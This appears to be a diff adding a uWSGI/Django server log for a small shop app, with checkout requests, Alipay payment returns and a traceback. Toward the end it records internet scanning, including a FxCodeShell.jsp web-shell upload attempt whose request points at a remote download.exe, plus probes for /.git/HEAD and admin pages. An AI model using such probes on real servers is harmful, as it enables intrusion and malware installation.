+[pid: 18124|app: 0|req: 16/16] 113.88.13.180 () {44 vars in 832 bytes} [Mon Mar 18 12:23:30 2019] GET /bbf/addgoods/?goodsid=1&goodsNum=3 => generated 170 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 17/17] 113.88.13.180 () {44 vars in 861 bytes} [Mon Mar 18 12:23:31 2019] GET /bbf/cart/ => generated 17778 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 18/18] 113.88.13.180 () {44 vars in 866 bytes} [Mon Mar 18 12:23:36 2019] GET /bbf/generateorder/ => generated 12425 bytes in 29 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18124|app: 0|req: 19/19] 113.88.13.180 () {46 vars in 897 bytes} [Mon Mar 18 12:24:49 2019] GET /bbf/generateorder/ => generated 12248 bytes in 21 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 20:25:05 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 10:33:37
+os: Linux-4.4.0-117-generic #141-Ubuntu SMP Tue Mar 13 11:58:07 UTC 2018
+nodename: iZwz9fxweg30jhsua1ydimZ
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/bbf
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/bbf/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/bbf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 3824
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:9030 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xa31400
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xa31400 pid: 18209 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 18209, cores: 1)
+[pid: 18209|app: 0|req: 1/1] 113.88.13.180 () {42 vars in 791 bytes} [Mon Mar 18 12:25:19 2019] GET /bbf/ => generated 83404 bytes in 244 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18209|app: 0|req: 2/2] 113.88.13.180 () {44 vars in 869 bytes} [Mon Mar 18 12:25:22 2019] GET /bbf/product_details/1/ => generated 28580 bytes in 18 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18209|app: 0|req: 3/3] 113.88.13.180 () {44 vars in 832 bytes} [Mon Mar 18 12:25:24 2019] GET /bbf/addgoods/?goodsid=1&goodsNum=1 => generated 170 bytes in 10 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18209|app: 0|req: 4/4] 113.88.13.180 () {44 vars in 861 bytes} [Mon Mar 18 12:25:27 2019] GET /bbf/cart/ => generated 17778 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18209|app: 0|req: 5/5] 113.88.13.180 () {44 vars in 866 bytes} [Mon Mar 18 12:25:55 2019] GET /bbf/generateorder/ => generated 12425 bytes in 30 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 20:35:02 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 10:33:37
+os: Linux-4.4.0-117-generic #141-Ubuntu SMP Tue Mar 13 11:58:07 UTC 2018
+nodename: iZwz9fxweg30jhsua1ydimZ
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/bbf
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/bbf/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/bbf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 3824
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:9030 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x19d1400
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x19d1400 pid: 18240 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 18240, cores: 1)
+[pid: 18240|app: 0|req: 1/1] 113.88.14.120 () {42 vars in 791 bytes} [Mon Mar 18 12:35:09 2019] GET /bbf/ => generated 83404 bytes in 231 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 2/2] 113.88.14.120 () {44 vars in 869 bytes} [Mon Mar 18 12:35:11 2019] GET /bbf/product_details/3/ => generated 28352 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 3/3] 113.88.14.120 () {44 vars in 832 bytes} [Mon Mar 18 12:35:16 2019] GET /bbf/addgoods/?goodsid=3&goodsNum=4 => generated 134 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 4/4] 113.88.14.120 () {44 vars in 861 bytes} [Mon Mar 18 12:35:18 2019] GET /bbf/cart/ => generated 17750 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 5/5] 113.88.14.120 () {44 vars in 866 bytes} [Mon Mar 18 12:35:21 2019] GET /bbf/generateorder/ => generated 12397 bytes in 36 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 6/6] 113.88.14.120 () {46 vars in 897 bytes} [Mon Mar 18 12:36:09 2019] GET /bbf/generateorder/ => generated 12248 bytes in 19 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 7/7] 113.88.14.120 () {44 vars in 857 bytes} [Mon Mar 18 12:36:11 2019] GET /bbf/mine/ => generated 12494 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 8/8] 113.88.14.120 () {44 vars in 849 bytes} [Mon Mar 18 12:36:31 2019] GET /bbf/mine/? => generated 12494 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+<QuerySet [<Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>]>
+[pid: 18240|app: 0|req: 9/9] 113.88.14.120 () {44 vars in 859 bytes} [Mon Mar 18 12:36:36 2019] GET /bbf/orderlist/ => generated 7670 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 124 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 10/10] 113.88.14.120 () {42 vars in 791 bytes} [Mon Mar 18 12:36:52 2019] GET /bbf/ => generated 83404 bytes in 23 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 11/11] 113.88.14.120 () {44 vars in 822 bytes} [Mon Mar 18 12:51:48 2019] GET /bbf/ => generated 83404 bytes in 24 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 12/12] 113.88.13.180 () {44 vars in 869 bytes} [Mon Mar 18 12:51:58 2019] GET /bbf/product_details/1/ => generated 28580 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 13/13] 113.88.13.180 () {44 vars in 832 bytes} [Mon Mar 18 12:52:00 2019] GET /bbf/addgoods/?goodsid=1&goodsNum=1 => generated 170 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 14/14] 113.88.13.180 () {44 vars in 861 bytes} [Mon Mar 18 12:52:02 2019] GET /bbf/cart/ => generated 17778 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 15/15] 113.88.13.180 () {44 vars in 866 bytes} [Mon Mar 18 12:52:10 2019] GET /bbf/generateorder/ => generated 12425 bytes in 25 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18240|app: 0|req: 16/16] 83.209.157.90 () {32 vars in 446 bytes} [Mon Mar 18 14:04:07 2019] GET / => generated 2016 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18240|app: 0|req: 17/17] 47.101.204.94 () {34 vars in 461 bytes} [Mon Mar 18 14:39:32 2019] GET / => generated 2013 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18240|app: 0|req: 18/18] 172.104.108.109 () {34 vars in 383 bytes} [Mon Mar 18 14:46:47 2019] GET / => generated 2016 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 19/19] 140.205.118.182 () {34 vars in 503 bytes} [Mon Mar 18 14:48:47 2019] POST /bbf/appnotifyurl/ => generated 18 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 100 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 20/20] 183.17.235.21 () {44 vars in 2342 bytes} [Mon Mar 18 14:49:11 2019] GET /bbf/returnurl/?charset=utf-8&out_trade_no=201903181444575649&method=alipay.trade.page.pay.return&total_amount=1802.00&sign=Ui4k6Oa%2Fve4Z7ajdXk97z0bZhWAez15cqEaXy6uY1zN%2F7D%2FtI1iv%2BMps48%2BFpRKGy0sIYLLfx%2FdabZlEjE59EKTiG8h6zEOZFHPFpBfLThFqWKtypZDK0zK21pzgAACxVqieK3s9IgatyggTcttgzEJ%2BDRXk8HrcOmrIA5U1s4ei3PJU4VjAOWJB8pJWaUOYRGhUBFLt32rLzwlszHOtRhBay4r90kLzIfiqA0TR32UBZVOtIRyScWokpx6vxIRRcI7oqKTEkFIaN9QYU4%2B50FyqguH6sy6iu1hXyID9h0csiNxlW4CZdz4VB1PUsOZ%2Foyn0x6homcqFktEiKgHMwQ%3D%3D&trade_no=2019031822001450341000001001&auth_app_id=2016092800614528&version=1.0&app_id=2016092800614528&sign_type=RSA2&seller_id=2088102177626174&timestamp=2019-03-18+22%3A48%3A53 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 132 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 21/21] 183.17.235.21 () {44 vars in 1025 bytes} [Mon Mar 18 14:49:11 2019] GET /bbf/mine/ => generated 12494 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 18240|app: 0|req: 22/22] 183.17.235.21 () {42 vars in 772 bytes} [Mon Mar 18 14:49:12 2019] GET /favicon.ico => generated 2064 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 23/23] 183.17.235.21 () {44 vars in 833 bytes} [Mon Mar 18 14:49:24 2019] GET /bbf/mine/ => generated 12494 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 24/24] 183.17.235.21 () {44 vars in 816 bytes} [Mon Mar 18 14:51:02 2019] GET /bbf/ => generated 83404 bytes in 20 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 25/25] 183.17.235.21 () {42 vars in 790 bytes} [Mon Mar 18 14:51:03 2019] GET /bbf => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 26/26] 183.17.235.21 () {44 vars in 870 bytes} [Mon Mar 18 14:51:07 2019] GET /bbf/product_details/1/ => generated 28580 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 27/27] 183.17.235.21 () {44 vars in 833 bytes} [Mon Mar 18 14:51:10 2019] GET /bbf/addgoods/?goodsid=1&goodsNum=1 => generated 170 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 28/28] 183.17.235.21 () {44 vars in 862 bytes} [Mon Mar 18 14:51:11 2019] GET /bbf/cart/ => generated 17778 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18240|app: 0|req: 29/29] 183.17.235.21 () {44 vars in 867 bytes} [Mon Mar 18 14:51:14 2019] GET /bbf/generateorder/ => generated 12483 bytes in 29 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Internal Server Error: /bbf/pay/
+Traceback (most recent call last):
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/core/handlers/exception.py", line 41, in inner
+    response = get_response(request)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/core/handlers/base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/core/handlers/base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./app/views.py", line 390, in pay
+    print(orderid)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/db/models/manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/root/.virtualenv/bbf/lib/python3.5/site-packages/django/db/models/query.py", line 380, in get
+    self.model._meta.object_name
+app.models.DoesNotExist: Order matching query does not exist.
+[pid: 18240|app: 0|req: 30/30] 183.17.235.21 () {44 vars in 799 bytes} [Mon Mar 18 14:51:17 2019] GET /bbf/pay/?orderid=17 => generated 12425 bytes in 21 msecs (HTTP/1.1 500) 4 headers in 130 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 22:52:56 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 10:33:37
+os: Linux-4.4.0-117-generic #141-Ubuntu SMP Tue Mar 13 11:58:07 UTC 2018
+nodename: iZwz9fxweg30jhsua1ydimZ
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/bbf
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/bbf/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/bbf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 3824
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:9030 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x2707400
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x2707400 pid: 18608 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 18608, cores: 1)
+[pid: 18608|app: 0|req: 1/1] 183.17.235.21 () {42 vars in 792 bytes} [Mon Mar 18 14:53:26 2019] GET /bbf/ => generated 83404 bytes in 226 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 2/2] 183.17.235.21 () {44 vars in 870 bytes} [Mon Mar 18 14:53:50 2019] GET /bbf/product_details/1/ => generated 28580 bytes in 19 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 3/3] 183.17.235.21 () {44 vars in 833 bytes} [Mon Mar 18 14:53:53 2019] GET /bbf/addgoods/?goodsid=1&goodsNum=1 => generated 170 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 4/4] 183.17.235.21 () {44 vars in 862 bytes} [Mon Mar 18 14:53:55 2019] GET /bbf/cart/ => generated 17778 bytes in 18 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 5/5] 183.17.235.21 () {44 vars in 867 bytes} [Mon Mar 18 14:53:56 2019] GET /bbf/generateorder/ => generated 12483 bytes in 31 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+1111111
+18
+2222222
+[pid: 18608|app: 0|req: 6/6] 183.17.235.21 () {44 vars in 799 bytes} [Mon Mar 18 14:53:58 2019] GET /bbf/pay/?orderid=18 => generated 1002 bytes in 9 msecs (HTTP/1.1 200) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 7/7] 140.205.118.89 () {34 vars in 503 bytes} [Mon Mar 18 14:55:51 2019] POST /bbf/appnotifyurl/ => generated 18 bytes in 6 msecs (HTTP/1.1 200) 3 headers in 100 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 8/8] 183.17.235.21 () {44 vars in 2324 bytes} [Mon Mar 18 14:56:12 2019] GET /bbf/returnurl/?charset=utf-8&out_trade_no=201903181453562829&method=alipay.trade.page.pay.return&total_amount=284.00&sign=4UaUmLwQzthINPydoJYiGadKFkAlFN8MVKDVCOnliLQuC2FGcGfDvpK0pkh5sU1gpKM67tO3qJv8sPXWt54VmucaQUfW%2BsvuBk1VdHwqaizJAaw7RUEIKHpAYeYf8idltGVBA1Vk8Gf1UUSmtCrTWuOLPBpdaHjEeVxk%2FlaHS7nbyCw%2B2WIXabjapGF3R0xlnnXvTO1Mz0i63iD4aMLtvcNp0vbGJoUWp2%2B3DpmRJ0VWv11pTBCP6mBbbybZuWhpPagAtziOooGU6EWtLODhIifBk2W7VY3eSoLaoW8vtvXKB0tEN9MZ%2BDWtSBGZmWJfFYPOUur3dJZrs07T0sZk%2FA%3D%3D&trade_no=2019031822001450341000001002&auth_app_id=2016092800614528&version=1.0&app_id=2016092800614528&sign_type=RSA2&seller_id=2088102177626174&timestamp=2019-03-18+22%3A55%3A58 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 132 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 9/9] 183.17.235.21 () {44 vars in 1021 bytes} [Mon Mar 18 14:56:12 2019] GET /bbf/mine/ => generated 12494 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+<QuerySet [<Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>, <Order: Order object>]>
+[pid: 18608|app: 0|req: 10/10] 183.17.235.21 () {44 vars in 859 bytes} [Mon Mar 18 14:56:22 2019] GET /bbf/orderlist/ => generated 8534 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 124 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 11/11] 47.101.204.188 () {34 vars in 462 bytes} [Mon Mar 18 15:12:04 2019] GET / => generated 2013 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 12/12] 163.47.145.202 () {32 vars in 447 bytes} [Mon Mar 18 16:03:08 2019] GET / => generated 2016 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /admin/login/index.html
+[pid: 18608|app: 0|req: 13/13] 203.34.153.71 () {42 vars in 807 bytes} [Mon Mar 18 16:37:13 2019] GET /admin/login/index.html => generated 3858 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 14/14] 203.34.153.71 () {42 vars in 763 bytes} [Mon Mar 18 16:37:13 2019] GET / => generated 2013 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /mall/views/default/css/base.css
+[pid: 18608|app: 0|req: 15/15] 203.34.153.71 () {42 vars in 825 bytes} [Mon Mar 18 16:37:13 2019] GET /mall/views/default/css/base.css => generated 2124 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /public/static/Admin/js/admin.js
+[pid: 18608|app: 0|req: 16/16] 203.34.153.71 () {42 vars in 825 bytes} [Mon Mar 18 16:37:13 2019] GET /public/static/Admin/js/admin.js => generated 2124 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 17/17] 203.34.153.71 () {42 vars in 775 bytes} [Mon Mar 18 16:37:13 2019] GET /admin/ => generated 0 bytes in 6 msecs (HTTP/1.1 302) 7 headers in 265 bytes (1 switches on core 0)
+Not Found: /robots.txt
+[pid: 18608|app: 0|req: 18/18] 203.34.153.71 () {42 vars in 783 bytes} [Mon Mar 18 16:37:13 2019] GET /robots.txt => generated 2061 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 18608|app: 0|req: 19/19] 203.34.153.71 () {44 vars in 856 bytes} [Mon Mar 18 16:37:13 2019] GET /admin/login/?next=/admin/ => generated 1650 bytes in 15 msecs (HTTP/1.1 200) 7 headers in 381 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 20/20] 201.76.126.64 () {32 vars in 446 bytes} [Mon Mar 18 16:40:26 2019] GET / => generated 2016 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 21/21] 101.132.67.50 () {34 vars in 461 bytes} [Mon Mar 18 16:59:30 2019] GET / => generated 2013 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 18608|app: 0|req: 22/22] 118.31.244.58 () {26 vars in 262 bytes} [Mon Mar 18 17:30:14 2019] GET / => generated 55060 bytes in 30 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 23/23] 202.137.123.144 () {32 vars in 454 bytes} [Mon Mar 18 18:06:33 2019] GET / => generated 2016 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 18608|app: 0|req: 24/24] 47.95.28.143 () {26 vars in 261 bytes} [Mon Mar 18 19:16:00 2019] GET / => generated 55059 bytes in 28 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 25/25] 36.84.0.104 () {32 vars in 444 bytes} [Mon Mar 18 19:57:43 2019] GET / => generated 2016 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /.git/HEAD
+[pid: 18608|app: 0|req: 26/26] 34.222.184.93 () {34 vars in 393 bytes} [Mon Mar 18 21:02:37 2019] GET /.git/HEAD => generated 2058 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp 
+[pid: 18608|app: 0|req: 27/27] 120.79.169.46 () {42 vars in 629 bytes} [Mon Mar 18 21:21:29 2019] PUT /FxCodeShell.jsp%20 => generated 2081 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp::$DATA
+[pid: 18608|app: 0|req: 28/28] 120.79.169.46 () {42 vars in 643 bytes} [Mon Mar 18 21:21:29 2019] PUT /FxCodeShell.jsp::$DATA => generated 2097 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp/
+[pid: 18608|app: 0|req: 29/29] 120.79.169.46 () {42 vars in 625 bytes} [Mon Mar 18 21:21:29 2019] PUT /FxCodeShell.jsp/ => generated 2079 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp
+[pid: 18608|app: 0|req: 30/30] 120.79.169.46 () {38 vars in 735 bytes} [Mon Mar 18 21:21:29 2019] GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe => generated 2156 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 31/31] 93.115.226.46 () {32 vars in 446 bytes} [Mon Mar 18 21:53:09 2019] GET / => generated 2016 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /cache/global/img/gs.gif
+[pid: 18608|app: 0|req: 32/32] 80.82.70.187 () {32 vars in 414 bytes} [Mon Mar 18 22:35:16 2019] GET /cache/global/img/gs.gif => generated 2099 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 33/33] 59.36.132.144 () {28 vars in 292 bytes} [Mon Mar 18 23:32:24 2019] OPTION / => generated 2016 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 34/34] 59.36.132.144 () {28 vars in 289 bytes} [Mon Mar 18 23:32:24 2019] GET / => generated 2013 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 35/35] 185.56.183.192 () {32 vars in 446 bytes} [Mon Mar 18 23:52:00 2019] GET / => generated 2016 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /404/search_children.js
+[pid: 18608|app: 0|req: 36/36] 120.132.3.65 () {34 vars in 493 bytes} [Tue Mar 19 00:19:05 2019] GET /404/search_children.js => generated 2093 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 37/37] 106.14.215.243 () {34 vars in 462 bytes} [Tue Mar 19 00:32:12 2019] GET / => generated 2013 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 38/38] 79.172.237.8 () {32 vars in 444 bytes} [Tue Mar 19 01:14:33 2019] GET / => generated 2016 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 18608|app: 0|req: 39/39] 106.15.202.177 () {34 vars in 462 bytes} [Tue Mar 19 01:36:25 2019] GET / => generated 2013 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
